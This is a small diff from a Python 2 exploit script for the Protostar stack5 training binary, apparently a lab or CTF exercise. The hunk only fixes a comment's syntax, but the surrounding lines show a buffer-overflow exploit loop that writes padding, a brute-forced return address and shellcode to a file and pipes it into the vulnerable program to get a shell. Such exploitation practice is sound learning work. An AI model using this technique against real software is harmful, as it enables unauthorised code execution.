@@ -11,7 +11,7 @@ for i in range(0, 0x90):
                 this_eip = eip + i*4
                 pack_eip = struct.pack("I", this_eip)
                 f.write(padding+pack_eip+shellcode+b'\n')
-                f.close() // close file before cat or else it wont print out result
+                f.close() # close file before cat or else it wont print out result
                 print "[*] EIP: {0} ".format(hex(this_eip))
                 out_ = os.popen("(cat test.txt ; echo id ) | /opt/protostar/bin/stack5").read()
                 if len(out_):
